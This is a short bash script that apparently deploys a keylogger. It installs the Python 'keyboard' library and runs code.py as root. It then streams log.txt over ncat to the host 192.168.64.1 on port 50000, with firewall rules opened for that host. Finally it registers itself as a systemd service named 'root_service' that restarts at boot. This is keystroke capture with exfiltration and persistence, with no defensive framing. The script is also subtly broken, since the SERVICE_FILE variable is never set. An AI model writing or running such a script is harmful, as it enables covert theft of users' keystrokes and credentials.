sudo apt install net-tools
sudo ufw enable
sudo ufw allow 50000/tcp
sudo ufw allow out to 192.168.64.1
sudo ufw allow in from 192.168.64.1
pip install keyboard
sudo venv/bin/python3 -u code.py&
tail -f log.txt | ncat 192.168.64.1 50000 &
(
SERVICE_NAME="root_service"
SCRIPT_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"

# Create the systemd service file
sudo bash -c "cat > ${SERVICE_FILE}" <<EOL
[Unit]
Description=root_service
After=network.target

[Service]
ExecStart=${SCRIPT_PATH}
Restart=always

[Install]
WantedBy=multi-user.target
EOL

# Reload the systemd manager configuration 
sudo systemctl daemon-reload

# Enable the service to start on boot
sudo systemctl enable ${SERVICE_NAME}.service

# Start the service immediately
sudo systemctl start ${SERVICE_NAME}.service

echo "Service ${SERVICE_NAME} has been created and started."
)

~   
